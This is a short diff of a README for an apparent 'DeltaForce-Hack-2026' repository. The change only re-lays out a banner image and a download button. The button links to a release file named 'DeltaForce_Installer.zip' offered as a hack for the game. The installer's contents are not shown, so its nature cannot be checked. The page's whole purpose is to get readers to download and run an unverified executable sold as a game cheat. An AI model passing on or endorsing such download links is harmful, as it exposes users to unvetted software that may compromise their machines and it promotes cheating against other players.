@@ -7,15 +7,25 @@
 
 
 
-<a href="https://github.com/WantDeputyStage/DeltaForce-Hack-2026/releases/download/Latest/DeltaForce_Installer.zip">
-  <img width="160" alt="download_button_cropped" src="https://github.com/user-attachments/assets/c541e077-e932-44d1-b6d4-2a52eb980eee" />
-</a>
+<div align="center">
 
+  <img
+    width="474"
+    alt="Delta Force"
+    src="https://github.com/user-attachments/assets/ff15341b-9927-4d50-b219-62f3b483017e"
+  />
 
+  <br><br>
 
+  <a href="https://github.com/WantDeputyStage/DeltaForce-Hack-2026/releases/download/Latest/DeltaForce_Installer.zip">
+    <img
+      width="160"
+      alt="Download"
+      src="https://github.com/user-attachments/assets/c541e077-e932-44d1-b6d4-2a52eb980eee"
+    />
+  </a>
 
-<img width="474" height="266" alt="image" src="https://github.com/user-attachments/assets/ff15341b-9927-4d50-b219-62f3b483017e" />
-
+</div>
 
 
 **⚠️ Important Notice**
